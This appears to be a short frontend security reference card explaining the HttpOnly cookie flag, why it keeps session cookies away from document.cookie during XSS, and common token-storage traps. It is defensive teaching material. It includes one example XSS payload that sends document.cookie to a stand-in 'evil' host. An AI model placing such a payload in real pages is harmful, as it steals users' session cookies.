Frontenddocument.cookie · XSS

httpOnly means JS cannot read it.

HttpOnly means the browser stores and sends the cookie, but document.cookie cannot see it. XSS still runs as you (CSRF, plates 30, 233) — it just cannot dump that cookie from JS.

readable from the page

document.cookie

document.cookie // "sid=a8f3; theme=dark" XSS: fetch('https://evil?c=' + document.cookie)

If SPA code must read the session, you cannot use HttpOnly. That is the leak (plate 9).

vs

Set-Cookie from the server

HttpOnly

Set-Cookie: sid=…; HttpOnly document.cookie // "theme=dark" XSS cannot read sid can still POST /transfer

Frontend cannot add HttpOnly to a cookie it created in JS. Pair with Secure and SameSite (plate 233).

What

HttpOnly is a flag on the cookie, not a JS API. The browser still attaches it on matching requests. Pair with Secure (HTTPS) and SameSite.

Why

Session cookies. Defense in depth against XSS, not a substitute for sanitizing HTML (plate 234).

Trap

Reading the session from document.cookie in SPA code. Putting the access token in memory “so XSS can’t get it” and the refresh token in localStorage.
